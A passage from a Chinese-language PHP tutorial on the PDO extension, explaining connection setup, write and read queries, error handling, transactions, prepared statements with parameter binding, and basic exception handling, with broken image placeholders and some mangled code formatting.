#现在php.ini中找不到该配置项了</code></pre><p>2、PDO是一种针对多种数据库的扩展，那就意味着PDO很庞大，所以为了保证php运行的效率（系统会自动在开始时加载扩展），默认并没有开启对数据库产品的对应扩展，因此还需要在php.ini中开启目前项目所需要的PDO对应数据库产品的支持</p><pre><code>;extension=pdo_firebird;extension=pdo_mysql            #绝大部分项目使用的，只要去掉注释重启Apache即可;extension=pdo_oci;extension=pdo_odbc;extension=pdo_pgsql;extension=pdo_sqlite</code></pre><p>3、加载PDO对mysql数据库产品的扩展，重启Apache，然后通过phpinfo()函数就可以查看PDO的加载情况了，至少有两个加载才算成功：PDO本身和PDO针对的数据库产品</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9GltcHO5-1589898970676)(效果图/PDO扩展开启效果.png)]</p><blockquote><p>小结</p></blockquote><p>1、PDO是一种外部提供的扩展，php如果想直接调用，需要加载扩展</p><p>2、PDO因为支持产品很多，所以分解成了PDO支持扩展和PDO对应数据库产品的支持，PDO扩展在php5以后自动开启，而数据库产品的支持需要开发者根据实际项目所有数据库来选择性开启</p><h2 id="二、-PDO操作"><a href="#二、-PDO操作" class="headerlink" title="二、 PDO操作"></a><strong>二、 PDO操作</strong></h2><blockquote><p>学习目录：掌握使用系统类的方式，掌握PDO类和PDOStatement类的基本操作，实现数据库的增删改查</p></blockquote><ul><li>PDO手册查阅</li><li>PDO类基本应用</li><li>PDO写操作</li><li>PDO查询操作</li><li>PDO事务功能</li><li>PDO预处理</li></ul><h3 id="1、PDO手册查阅"><a href="#1、PDO手册查阅" class="headerlink" title="1、PDO手册查阅"></a><strong>1、PDO手册查阅</strong></h3><blockquote><p>目标：掌握系统的类的使用方法，学会API文档的使用</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>手册查阅</strong>：是指对于已经添加到php系统内的工具的使用查询</p><ul><li>通过翻阅手册，可以快速的了解一些工具或者扩展的功能和使用方式</li><li>通过翻阅手册，可以获取一些别人提供解决方案</li></ul><blockquote><p>示例</p></blockquote><p>1、查询方式1：进入到操作手册，然后打开目录列表：<strong>函数参考</strong>-&gt;<strong>数据库扩展</strong>-&gt;<strong>数据库抽象层</strong>-&gt;<strong>PDO</strong></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-si8YaiLS-1589898970678)(效果图\PDO类介绍.png)]</p><p><strong>注意</strong>：该方式能够方便且有序的看到一个工具或者扩展的所用功能和使用方式（初学者建议）</p><p>2、查询方式2：直接在操作手册进入<code>索引</code>，然后在里面输入PDO</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cQzX81UF-1589898970679)(效果图\PDO检索.png)]</p><p><strong>注意</strong>：该方式能够快速定位到查询的具体元素，需要大家在有一定了解的情况下才能完成（系统是按顺序匹配），在明确自己想要了解具体功能后，可以使用该方式</p><p>3、系统类使用方式：一般是了解对象的生成方式，以及各项功能的调用方式和具体效果</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-CK6Gnoii-1589898970681)(效果图\系统类使用技巧1.png)]</p><p>4、系统类使用方式：除开知道怎么用之外，一定还要去了解返回结果和<code>意外状况</code></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-CqFvQF3h-1589898970682)(效果图\系统类使用技巧2.png)]</p><p>5、当我们了解了一个工具的基本功能后，就可以找到入口开始对其学习和使用了。例如PDO中有三个类，每个类负责不同的功能需求。我们只要掌握彼此间的功能和练习，就可以使用PDO来实现数据库操作</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-m6ADYTca-1589898970684)(效果图\PDO三个类.png)]</p><blockquote><p>小结</p></blockquote><p>1、任何一种系统支持，包括工具和扩展，都可以通过操作手册来学习和应用</p><p>2、PDO属于一种数据库扩展，可以在<strong>函数参考</strong>下对应的<strong>数据库扩展</strong>下找到</p><p>3、扩展学习应该是目的性的，了解有哪些功能以及如何使用某个功能</p><p>4、PDO有三个类需要学习</p><h3 id="2、PDO类基本应用"><a href="#2、PDO类基本应用" class="headerlink" title="2、PDO类基本应用"></a><strong>2、PDO类基本应用</strong></h3><blockquote><p>目标：快速了解PDO类的基本功能，能够利用PDO类实现数据库的初始化认证和SQL执行</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDO类基本应用</strong>：了解PDO类的方法，使用PDO方法解决相应需求问题</p><ul><li><p>PDO类虽然提供了很多方法，但是常用的方法有以下几个</p><ul><li>PDO::__construct()：实例化PDO对象：帮助实现连接认证、数据库选择、字符集设置</li><li>PDO::exec()：执行一个写操作SQL指令，返回受影响的行数</li><li>PDO::query()：执行一个读操作SQL指令，返回一个PDOStatement类对象（后者进行数据解析操作）</li><li>PDO::errorCode()和PDO::errorInfo()：获取上次错误的信息（错误码和错误描述数组）</li></ul></li><li><p>PDO实例化对象：利用其构造方法__construct(string $dsn,string $user,string $pass[,array $drivers])实现，构造方法由4个参数组成，其中一般前三个为必须参数，第四个为可选参数</p><ul><li>$dsn：一个数据库基本信息字符串，包含数据库产品，主机地址等<ul><li>驱动名字（数据库产品），使用英文<code>:</code>分隔，如mysql:表示使用mysql数据库</li><li>驱动选项（主机地址），使用host=具体主机地址，跟在驱动名字之后，如’mysql:host=localhost’</li><li>驱动选项（端口），使用port=端口号，默认为3306可以不写，拼凑在驱动名字后，不区分先后顺序。如’mysql:host=localhost;port=3306’或者’mysql:port=3306;host=localhost’，使用分号和其他驱动分开</li><li>驱动选项（数据库名字），使用dbname=数据库名字（可以事先没有）</li><li>字符集设置（字符集名字）使用charset=字符集名字（可以事先没有）</li></ul></li><li>$user：用户名，如果数据库允许匿名用户出现，那么可以没有该参数（只有$dsn）</li><li>$pass：密码，与用户名一样</li><li>$drivers：PDO属性设置，是关联数组，利用PDO内部的常量进行设置</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、实例化PDO对象，完成数据库初始化认证</p><p>2、根据SQL类型选择不同的方法执行SQL</p><p>3、检查SQL可能存在的语法错误</p><blockquote><p>示例</p></blockquote><p>1、实例化PDO对象，完成初始化操作</p><pre><code># 方案1：直接写入数据进行数据库初始化$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);# 方案2：利用变量保存数据来实现数据库初始化（数据来源可以是其他配置文件：安全）$dsn = &apos;mysql:host=localhost;dbname=db_2;charset=utf8&apos;;$user = &apos;root&apos;;$pass = &apos;root&apos;;$pdo = new PDO($dsn,$user,$pass);</code></pre><p>2、得到对象后，我们就可以利用PDO对象调用相关方法执行SQL操作：exec执行数据返回SQL，query执行有结果返回SQL</p><pre><code># 实例化PDO对象$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# 写操作$sql = &quot;delete from t_28&quot;;        # 模拟SQL指令$rows = $pdo-&gt;exec($sql);        # 得到受影响的行数：执行失败返回false# 读操作$sql = &quot;select * from t_40&quot;;$stmt = $pdo-&gt;query($sql);        # 成功返回PDOStatement类对象，失败得到false</code></pre><p>3、如果PDO对象在执行SQL时出现错误，即SQL本身有错误，那么可以通过PDO类提供的errorCode()和errorInfo()</p><pre><code># 实例化PDO对象$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# 写操作$sql = &quot;delete fromt_40&quot;;        # 错误SQL$rows = $pdo-&gt;exec($sql);# 错误判定：exec方法执行结果成功也存在返回0的情况，错误会返回false，所以要判定是否是SQL错误，需要判定结果为falseif(false === $rows){    # 取出错误细信息    echo &apos;SQL错误：&lt;br/&gt;&apos;;    echo &apos;错误代码为：&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;    echo &apos;错误原因为：&apos; . $pdo-&gt;errorInfo()[2];                # errorInfo返回数组，2下标代表错误具体信息    exit;            # 错误不需要继续执行代码}</code></pre><blockquote><p>小结</p></blockquote><p>1、PDO是一种外部提供的扩展，可以通过操作手册来协助学习使用</p><p>2、PDO类主要用来实现数据库的初始化操作和SQL指令的执行</p><p>3、 SQL执行的结果不论是写操作还是读操作都有可能出错，因此需要进行错误处理</p><h3 id="3、PDO写操作"><a href="#3、PDO写操作" class="headerlink" title="3、PDO写操作"></a><strong>3、PDO写操作</strong></h3><blockquote><p>目标：利用PDO类完成一个完整的写操作实现</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>写操作</strong>：即利用PDO实现数据库增删改操作</p><ul><li>操作过程中要考虑到SQL本身可能出现的错误处理，以及对结果的操作处理</li><li>很多代码的执行都需要进行错误检查，可以对代码进行封装处理</li></ul><blockquote><p>步骤</p></blockquote><p>1、初始化连接资源</p><p>2、组织SQL并执行</p><p>3、检查SQL执行结果，判定语法错误</p><p>4、返回受影响的行数（必要时返回自增长ID）</p><blockquote><p>示例</p></blockquote><p>1、初始化PDO，每次操作都需要用到PDO实例化：封装执行</p><pre><code># 初始化PDO：增加错误抑制符，一致在初始化过程可能出现的错误（信息不对连接不上）function pdo_init(){    $pdo = @new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);    if(!$pdo){        exit(&apos;数据库连接认证失败！&apos;);    }    # 返回得到的PDO对象    return $pdo;}</code></pre><p>​    </p><p>2、SQL通常应该是外部传入，外部需要的只是结果，不考虑过程，所以在实际开发时要考虑二次封装。即外部传入SQL，内部执行并控制错误，最终返回结果</p><pre><code># 封装执行：函数封装需要传入PDO对象（也可以在函数内部实例化对象）function pdo_exec($pdo,$sql){    # 调用PDO对象的方法执行写SQL    $res = $pdo-&gt;exec($sql);    # 错误判定    if(false === $res){        # 取出错误细信息：实际开发是将错误信息记录到系统日志中，返回false        echo &apos;SQL错误：&lt;br/&gt;&apos;;        echo &apos;错误代码为：&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;        echo &apos;错误原因为：&apos; . $pdo-&gt;errorInfo()[2];                    exit;    }    # 返回执行结果：受影响的行数（直接是受影响的行数）    return $res;}</code></pre><p>3、具体实现写操作</p><pre><code># 引入文件：封装的PDO文件include &apos;pdo.php&apos;;            # 假设所有封装都放到了pdo.php中# 初始化$pdo = pdo_init();# 组织要执行的SQL$sql = &apos;delete from t_29&apos;;$res = pdo_exec($pdo,$sql);# 结果使用echo &apos;本次操作共实现数据库操作：&apos; . $res . &apos;条记录！&apos;;</code></pre><p><strong>注意</strong>：一般写操作都是受影响行数，但是如果是插入操作，有时候需要新增记录的自增长ID，可以通过PDO::lastInsertId()来获取</p><pre><code># 接上述代码$id = $pdo-&gt;lastInsertId();    # 实际开发也应封装echo &apos;新增成功！新增的ID为：&apos; . $id;</code></pre><blockquote><p>小结</p></blockquote><p>1、实际使用PDO的时候，都会进行二次封装，因为PDO的操作有很多本身不够完善</p><p>2、PDO类可以独立完成写操作功能，而不需要使用其他两个工具类</p><p>3、PDO的写操作其实本质要注意的是执行SQL时可能出现的错误处理</p><p>4、写操作中唯一不同的是插入操作，因为可能需要获取自增长ID，此时需要多一个步骤（功能）</p><h3 id="4、PDO查询操作"><a href="#4、PDO查询操作" class="headerlink" title="4、PDO查询操作"></a><strong>4、PDO查询操作</strong></h3><blockquote><p>目标：掌握PDO对查询操作的实现，理解类中产生其他类对象的原理，实现数据库的查询操作</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>查询操作</strong>：通过执行SQL指令后从数据库获得相应的数据，然后对数据加工变成php可识别的格式</p><ul><li><p>PDO::query()方法只能执行SQL，并不能直接解析结果，返回一个PDOStatement类对象</p></li><li><p>PDOStatement::fetch()系列方法从对象中实现数据获取</p><ul><li>fetch：获取一条记录</li><li>fetchAll：获取全部记录</li></ul></li><li>FETCH_STYLE：通过常量设计的方式实现获取数据的不同效果</li></ul><blockquote><p>步骤</p></blockquote><p>1、初始化数据库连接</p><p>2、组织SQL指令并通过PDO::query()执行</p><p>3、检查可能出现的SQL语法错误</p><p>4、通过PDOStatement类按照具体需求实现数据解析</p><blockquote><p>示例</p></blockquote><p>1、查询是建立在连接之上，因此需要使用到前面封装的初始化功能</p><pre><code>function pdo_init(){    $pdo = @new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);    if(!$pdo){        exit(&apos;数据库连接认证失败！&apos;);    }    # 返回得到的PDO对象    return $pdo;}</code></pre><p>2、查询的SQL也是可能出现问题的部分，因此同样需要进行错误检查：另外PDO查询使用的是PDO::query()方法实现</p><pre><code>function pdo_query($pdo,$sql){    # 调用PDO对象的方法执行读SQL    $stmt = $pdo-&gt;query($sql);    # 错误判定    if(false === $stmt){        # 取出错误细信息        echo &apos;SQL错误：&lt;br/&gt;&apos;;        echo &apos;错误代码为：&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;        echo &apos;错误原因为：&apos; . $pdo-&gt;errorInfo()[2];                    exit;    }    # 返回执行结果：PDOStatement类对象    return $stmt;}</code></pre><p>3、此时查询出来的结果是一个对象，不能提供任何php可访问的数据结果，还需要对结果进行处理。而我们查询数据的时候通常是两种操作：根据具体条件获取一条记录或者多条记录，因此返回的数据是不同的。解决方案也有多种方式：</p><ul><li>①创建多个函数来实现不同效果</li><li><p>②创建一个函数，但是通过参数来控制实现不同效果</p><p>function pdo_get($stmt,$only = true){</p><pre><code># $stmt是PDO查询得到的对象，$only代表默认只获取一条记录# 安全判定if(!$stmt instanceof PDOStatement) return false;# PDOStatement类中提供了两种方法分别去获取一条和多条记录# 判定条件if($only){    # 获取一条记录PDOStatement::fetch()：返回一维数组    return $stmt-&gt;fetch();}else{    # 获取多条记录PDOStatement::fetchAll()：返回二维数组，一个维度代表一条记录    return $stmt-&gt;fetchAll();}</code></pre><p>}</p></li></ul><p>4、此时从功能上来讲，只要顺序调用以上几个方法即可完成</p><pre><code>$pdo = pdo_init();            # 初始化# 查询$sql = &apos;select * from t_40 where 条件&apos;;$stmt = pdo_query($pdo,$sql);# 获取一条记录$row = pdo_get($stmt);# 获取多条记录$rows = pdo_get($stmt,false);</code></pre><p>5、fetch系列方法默认返回的数据是重复的：数据的索引方式和关联方式各出现一次，而实际在进行开发数据展示时通常是通过数据表字段名字作为下标进行数据查看，所以此时可以通过设定fetch系列的条件fetch_style来实现</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A20W0ws7-1589898970684)(效果图\PDO的fetch方式.png)]</p><p>可以根据系统提供的方式来修改pdo_get函数，在后面再增加一个默认参数即可</p><pre><code>function pdo_get($stmt,$only = true,$fetch_style = PDO::FETCH_ASSOC){    # fetch_style默认使用关联数组返回    # 判定条件    if($only){        # 获取一条记录PDOStatement::fetch()：返回一维数组        return $stmt-&gt;fetch($fetch_style);    }else{        # 获取多条记录PDOStatement::fetchAll()：返回二维数组，一个维度代表一条记录        return $stmt-&gt;fetchAll($fetch_style);    }}</code></pre><blockquote><p>小结</p></blockquote><p>1、查询操作是通过PDO::query()执行查询SQL得到PDOStatement对象，然后PDOStatement对象下有一系列fetch方法可以实现数据查询，得到php可以识别的数组数据</p><p>2、PDO实现查询通常也需要进行二次封装，保证SQL执行安全，也方便用户获取目标数据</p><h3 id="5、PDO事务功能"><a href="#5、PDO事务功能" class="headerlink" title="5、PDO事务功能"></a><strong>5、PDO事务功能</strong></h3><blockquote><p>目标：掌握PDO对于MySQL事务的封装，能够利用PDO实现事务操作需求</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDO事务功能</strong>：并非PDO额外多出了一项功能，而是将原来MySQL所支持的事务操作进行了一定的封装实现</p><ul><li>事务执行是否成功是由MySQL对应的存储引擎（InnoDB支持）是否支持决定的</li><li>PDO只是对具体的操作步骤进行了封装而已<ul><li>PDO::beginTransaction()：开启事务</li><li>PDO::exec()：执行事务（写操作）</li><li>PDO::rollBack()：回滚所有事务</li><li>PDO::commit()：成功提交所有事务</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、初始化数据库操作</p><p>2、开启事务</p><p>3、执行事务</p><p>4、根据结果选择对事务操作的处理</p><blockquote><p>示例</p></blockquote><p>1、事务操作的基本实现</p><pre><code># 实例化PDO对象$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);# 开启事务$pdo-&gt;beginTransaction() or die(&apos;事务开启失败&apos;);/*    # PDO类内部    public function beginTransaction(){        $sql = &apos;start transaction&apos;;        # 写方法执行        $res = $this-&gt;exec($sql);        # 判定结果        if($res === false) return false;        return true;    }*/# 执行事务$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);# 连续操作# 终止事务：判定结果$pdo-&gt;commit();                # 成功提交$pdo-&gt;rollback();            # 失败回滚</code></pre><p>2、在事务操作中，有一种回滚点机制，在PDO中没有实现，如果有必要，可以通过SQL指令设置来实现</p><pre><code># 实例化PDO对象$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# 开启事务$pdo-&gt;beginTransaction() or die(&apos;事务开启失败&apos;);# 执行事务$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);# 设置回滚点$pdo-&gt;exec(&apos;savepoint sp1&apos;);/*    # 封装设置回滚点的函数    function savepoint($pdo,$name){        $sql = &quot;savepoint {$name}&quot;;        # 执行        $res = $pdo-&gt;exec($sql);        # 判定结果        return $res ==== false ? false : true;    }*/# 继续执行事务...# 回滚$pdo-&gt;exec(&apos;rollback to sp1&apos;);# 终止事务$pdo-&gt;commit();                # 成功提交$pdo-&gt;rollback();            # 失败回滚</code></pre><blockquote><p>小结</p></blockquote><p>1、事务的本质是由既定SQL指令完成，而事务具体操作内容一定是外部指定的SQL（写操作）来处理</p><p>2、PDO提供了事务固定内容的封装，包括开启事务（PDO::beginTransaction()）和事务终止（PDO::commit()和PDO::rollback()）</p><p>3、回滚点可以通过PDO::exec()方法来设定和回滚</p><p>4、如果不采用PDO的事务机制，也可以完全利用PDO::exec()来实现</p><ul><li>PDO::exec(‘start transaction’)：开启事务</li><li>PDO::exec(‘commit’)：提交事务</li><li>PDO::exec(‘rollback’)：回滚事务</li></ul><h3 id="6、PDO预处理"><a href="#6、PDO预处理" class="headerlink" title="6、PDO预处理"></a><strong>6、PDO预处理</strong></h3><blockquote><p>目标：掌握PDO对于MySQL预处理的支持，能够利用PDO实现预处理操作</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDO预处理</strong>：是PDO封装一套特定的方法，在方法中做了一些优化操作，使得开发人员可以便捷的用来实现预处理</p><ul><li><p>PDO预处理的实现是基于MySQL预处理机制，只是针对预处理的操作过程进行了内部封装</p><ul><li>参数处理：可以使用原占位符<code>?</code>，也可以使用PDO占位符<code>:名字</code></li></ul></li><li><p>PDO中预处理提供了一套方法机制，主要由以下几个方法组成</p><ul><li>PDO::prepare()：发送预处理指令，只需要提供要执行的指令即可，不需要prepare 名字 from。成功得到一个PDOStatement类对象，失败得到一个false（或者异常错误）</li><li>PDOStatement::bindParam()：绑定预处理所需要的参数，只能绑定变量（引用传递）</li><li>PDOStatement::bindValue()：绑定预处理所需要的参数，可以绑定值（值传递）</li><li>PDOStatement::execute()：执行预处理，成功返回true，失败返回false</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、PDO发送预处理指令：即利用PDO::prepare()方法将要执行的SQL指令先发送给服务器编译</p><pre><code># 实例化PDO对象$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);</code></pre><p>​<br>​    # 发送预处理指令<br>​    $pre_sql = “select <em> from t_40”;                # 无数据预处理指令<br>​    $pre_sql = “select </em> from t_40 where id = ?”;    # 有参数预处理指令<br>​    $pre_sql = “select * from t_40 where id = :id”;    # PDO特定预处理参数指令（: + 字符串），更明确<br>​    </p><pre><code># 执行最后一条预处理指令：即使用:id作为参数的$stmt = $pdo-&gt;prepare($pre_sql);if(!$stmt) die(&apos;预处理指令执行失败！&apos;);</code></pre><p>2、绑定预处理参数：如果预处理本身是需要携带参数的，那么可以使用PDOStatement::bindValue()/bindParam()进行参数绑定</p><p><strong>PDOStatement::bandValue()</strong></p><pre><code># 接上述代码$stmt-&gt;bindValue(&apos;:id&apos;,1);            # 直接绑定数值$id = 2;$stmt-&gt;bindValue(&apos;:id&apos;,$id);        # 绑定变量数据</code></pre><p><strong>注意</strong>：如果在发送预处理指令的时候，使用的是“?”作为占位符，那么我们在进行绑定数据的时候，是按照顺序进行绑定的，起始位置的占位符序号为1，如果有多个占位符，依次类推</p><pre><code># 预处理指令：select * from t_40 where id = ?$stmt-&gt;bindValue(1,$id);</code></pre><p><strong>PDOStatement::bindParam()</strong></p><pre><code># 接预处理指令# $stmt-&gt;bindParam(&apos;:id&apos;,3);        # 错误：不能绑定值，引用传递，只能是变量$id = 4;$stmt-&gt;bindParam(&apos;:id&apos;,$id);        # 必须是传递变量    </code></pre><p>4、执行预处理：利用PDOStatement::execute()方法</p><pre><code># 接上述代码$res = $stmt-&gt;execute();if(!$res) die(&apos;预处理执行失败！&apos;);# 如果是查询，想要得到预处理执行的结果，还需要使用PDOStatement::fetch()方法进行数据解析$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><blockquote><p>小结</p></blockquote><p>1、PDO预处理除了本身实现了MySQL的预处理，还额外优化了占位符：使用: + 名字作为占位符（查看更清晰）</p><p>2、PDO利用了PDO::prepare()方法发送预处理SQL指令，成功得到PDOStatement对象</p><p>3、PDO利用PDOStatement::bindValue()/bindParam()来实现预处理数据绑定</p><p>4、PDO利用PDOStatement::execute()来实现调用预处理</p><p>5、如果利用PDO预处理来实现数据查询，那么在执行完成预处理之后，还需要调用PDOStatement::fetch()方法获取预处理得到的数据</p><h3 id="7、PDO预处理数据绑定"><a href="#7、PDO预处理数据绑定" class="headerlink" title="7、PDO预处理数据绑定"></a><strong>7、PDO预处理数据绑定</strong></h3><blockquote><p>目标：掌握PDO关于预处理参数绑定的实现，掌握不同类型数据绑定的实际区别</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>数据绑定</strong>：是指在进行预处理指令定义时使用了占位符，为了保证后续执行预处理时能够正确执行，将实际数据替换占位符的过程</p><ul><li>数据绑定的方式应该与占位符方式对应</li><li>PDOStatement::execute()方法本身就可以实现数据传递和绑定</li><li>PDOStatement::bindValue()和bindParam()在实际运用中有明显区别</li></ul><blockquote><p>示例</p></blockquote><p>1、在PDO中，execute本身是可以直接进行数据绑定的，即在参数中增加对应的占位符数据，以数组形式传入</p><pre><code># 预处理形式使用原始占位符？$stmt = $pdo-&gt;prepare(&apos;select * from t_40 where id = ?&apos;);$stmt-&gt;execute(array(10));        # array代表是数组，10代表是替换值，如果有多个元素，顺序放入即可# 预处理形式使用PDO占位符：+ 名字$stmt = $pdo-&gt;prepare(&apos;select * from t_40 where id = :id&apos;);$stmt-&gt;execute(array(&apos;:id&apos; =&gt; 10));    # 使用占位符作为数组元素下标</code></pre><p>2、PDOStatement::bindValue()和PDOStatement::bindParam()区别</p><ul><li>二者都可以实现占位符的数据绑定</li><li>bindValue()绑定数据的方式灵活，可以是变量也可以是数据常量；而bindParam()只能是变量</li><li><p>因为bindParam绑定的是变量（引用传值），所以如果被绑定的变量发生改变，会直接影响后续execute结果</p><p>$stmt = $pdo-&gt;prepare(‘select * from t_40 where id = :id’);</p><p>$id = 1;<br>$stmt-&gt;bindValue(‘:id’,$id);<br>for(;$id &lt; 10;$id++){</p><pre><code>$stmt-&gt;execute();$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><p>}</p><h1 id="上述所有结果-row都是s-id为1的数据"><a href="#上述所有结果-row都是s-id为1的数据" class="headerlink" title="上述所有结果$row都是s_id为1的数据"></a>上述所有结果$row都是s_id为1的数据</h1><p>$id = 1;<br>$stmt-&gt;bindParam(‘:id’,$id);<br>for(;$id &lt; 10;$id++){</p><pre><code>$stmt-&gt;execute();$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><p>}</p><h1 id="上述所有结果-row是s-id从1-9的数据"><a href="#上述所有结果-row是s-id从1-9的数据" class="headerlink" title="上述所有结果$row是s_id从1-9的数据"></a>上述所有结果$row是s_id从1-9的数据</h1></li></ul><blockquote><p>小结</p></blockquote><p>1、PDO绑定预处理数据的方式有多重：PDOStatement::bindValue()/bindParam()/execute()</p><p>2、如果数据简单且不需要重复，那么使用bindValue()/execute()都可以</p><p>3、如果数据本身是变化的，而且是有规则（数组遍历出来的结果），那么可以使用bindParam()来节省操作</p><h2 id="三、-PDO异常"><a href="#三、-PDO异常" class="headerlink" title="三、 PDO异常"></a><strong>三、 PDO异常</strong></h2><blockquote><p>学习目标：理解异常的概念，掌握异常处理的方式，掌握PDO中异常的实际应用</p></blockquote><ul><li>异常机制</li><li>PDO错误机制</li><li>PDOException异常处理</li></ul><h3 id="1、异常机制"><a href="#1、异常机制" class="headerlink" title="1、异常机制"></a><strong>1、异常机制</strong></h3><blockquote><p>目标：了解异常概念，掌握异常的实现模式</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>异常机制</strong>：Exception，是面向对象中一种错误捕捉机制</p><ul><li><p>用来捕捉一些执行层面的问题（语法问题会在编译时就出现，开发可以避免）</p></li><li><p>通常是因为一些不确定的内容导致代码无法正常运行，然后我们可以按照设定的逻辑来处理这些问题</p></li><li><p>异常机制允许开发者主动处理错误，而不是被动的处理错误</p></li><li><p>异常机制是面向对象语言中一种程度的处理错误的方式</p></li><li><p>php提供了一套成熟的异常处理机制：Exception类</p><ul><li>php默认的是警告模式：即出错后立即报错给用户</li><li>php想要使用异常机制：需要触发异常机制（set_error_handler(回调函数)）</li></ul></li><li><p>异常处理语法</p><ul><li><p>捕获异常</p><p>try{</p><pre><code># 可能出现异常的代码</code></pre><p>}catch(Exception 异常对象){</p><pre><code># 主动处理异常（错误信息在异常对象中）</code></pre><p>}</p></li><li><p>主动抛出异常</p><h1 id="根据逻辑判定主动终止代码执行"><a href="#根据逻辑判定主动终止代码执行" class="headerlink" title="根据逻辑判定主动终止代码执行"></a>根据逻辑判定主动终止代码执行</h1><p>throw new Exception();        # 不同的异常可以有不同的类</p></li><li><p>处理异常：在catch中主动处理异常，优雅的给用户提示结果</p></li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、确定使用异常进行错误处理：设置异常处理解决方案</p><p>2、确定异常可能出现的种类，明确要使用的异常类</p><p>3、明确有可能出现错误的代码：使用try将代码块包裹</p><ul><li>必要时在里面主动抛出异常</li></ul><p>4、捕获异常处理异常，在catch中获取抛出的异常对象</p><ul><li>在catch内部进行错误处理</li></ul><blockquote><p>示例</p></blockquote><p>1、明确可能出现错误的代码。如：</p><pre><code>$res = 4 / 0;</code></pre><ul><li><p>上述代码在编译时不存在问题，但是在运行的时候因为被除数为0，所以会出现错误。而这个时候默认的，就是系统无法正确执行，立马给出错误（php默认的规则）。这种错误直接给出的方式不属于异常捕捉，异常捕捉需要用到异常类Exception类进行捕捉：使用throw</p><h1 id="外部传入数据：不确定"><a href="#外部传入数据：不确定" class="headerlink" title="外部传入数据：不确定"></a>外部传入数据：不确定</h1><p>$n1 = 10;<br>$n2 = 5;</p><h1 id="要求-n1-n2"><a href="#要求-n1-n2" class="headerlink" title="要求$n1 / $n2"></a>要求$n1 / $n2</h1><p>if($n2 == 0){</p><pre><code># 被除数为0，不能操作：抛出异常throw new Exception(&apos;被除数不能为0！&apos;);</code></pre><p>}</p><h1 id="没有问题继续执行"><a href="#没有问题继续执行" class="headerlink" title="没有问题继续执行"></a>没有问题继续执行</h1><p>$res = $n1 / $n2;</p></li><li><p>很明显，使用面向对象的方式会额外增加代码来实现错误处理。但是在面向对象中，异常机制通常很成熟，并不需要写额外很多的代码，而且绝大部分时间里，我们并不会去处理“不可能”出现问题的代码。</p></li></ul><p>2、可以将代码块放到一个会自动捕获错误的代码块中来实现异常的处理。异常捕捉语法如下：</p><pre><code># 正常不会出错代码echo &apos;hello world&apos;;$n1 = $_GET[&apos;n1&apos;];$n2 = $_GET[&apos;n2&apos;];# 可能出现异常代码：使用try{}进行包裹捕捉try{    # 代码的执行具有未知性：但是代码没有语法错误    $res = $n1 / $n2;                    # 产生错误就会产生一个Exception类对象，捕获错误}catch(Exception $e){    # 捕获后的处理代码：如果try中没有问题，不会进入到catch内部    # $e中保存了$res = $n1 / $n2;会出现的错误    die(&apos;出错了...&apos;);}</code></pre><p>3、以上代码在php中运行即便出错也不会执行，原因是系统默认使用的警告模式，即有任何问题都是直接报错。如果要实现异常处理，必须借助于系统提供的set_error_handler(回调函数)来告知系统我们想采用的处理模式</p><pre><code>set_error_handler(function (){    throw new Exception(&apos;错误！&apos;);});# 上述方式等价于先定义函数后注册function exception_handler(){    throw new Exception(&apos;错误&apos;);}set_error_handler(&apos;exception_handler&apos;);</code></pre><p>4、有了上述代码在错误处理之前，那么系统碰到错误，就会调用我们定义的function来进行错误处理：处理也分两种模式：有try和没有try</p><pre><code># 接上述代码：没有try$res = 5 / 0;# 错误：直接报错，但是实际上已经调用了自定义错误处理函数，只是异常没有处理，系统处理了# 有try：try和catch不分家try{    $res = 5 / 0;}catch(Exception $e){    die(&apos;错误：被除数不能为0&apos;)；}</code></pre><p>5、异常对象$e到目前为止没有产生任何作用，其实Exception类中有很多的方法和属性，可以帮助我们统一获取错误信息的</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-8KK0bkF6-1589898970685)(效果图\异常类Exception.png)]</p><p>具体使用如下</p><pre><code>try{    # 